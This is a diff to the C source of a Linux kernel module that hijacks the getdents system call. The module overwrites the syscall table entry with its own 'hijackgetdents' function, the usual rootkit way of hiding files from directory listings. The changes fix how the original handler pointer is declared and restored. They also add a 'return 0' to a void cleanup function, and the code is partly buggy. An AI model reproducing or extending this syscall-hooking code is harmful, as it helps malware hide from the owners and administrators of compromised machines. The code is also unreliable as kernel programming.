@@ -23,14 +23,13 @@ struct linux_dirent{
 
 };
 
-typedef asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-
+typedef asmlinkage int (*originalGetDentsA) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+originalGetDentsA originalGetDents=NULL;
 
 static asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
     struct linux_dirent *hijackedDirent;
     char* fileNames;
-    long original = originalGetDentsFunc(fd, dirp, count);
-
+    long original = originalGetDents(fd, dirp, count);
 
     if (original<= 0){
       return original;
@@ -56,7 +55,7 @@ return original;
 static int init_syscall(void)
 {
         syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
-        originalGetDents=syscall_table[sys_getdents];
+        originalGetDents =syscall_table[sys_getdents];
         syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
         printk(KERN_INFO "Custom syscall loaded\n");
         return 0;
@@ -64,9 +63,10 @@ static int init_syscall(void)
 
 static void cleanup_syscall(void)
 {
-        syscall_table[sys_getdents]=originalGetDents;
+        syscall_table[sys_getdents]=(*originalGetDents);
         printk(KERN_INFO "Syscall at offset %d : %p\n", sys_getdents, (void *)syscall_table[sys_getdents]);
         printk(KERN_INFO "Custom syscall unloaded\n");
+        return 0;
 }
 
 module_init(init_syscall);
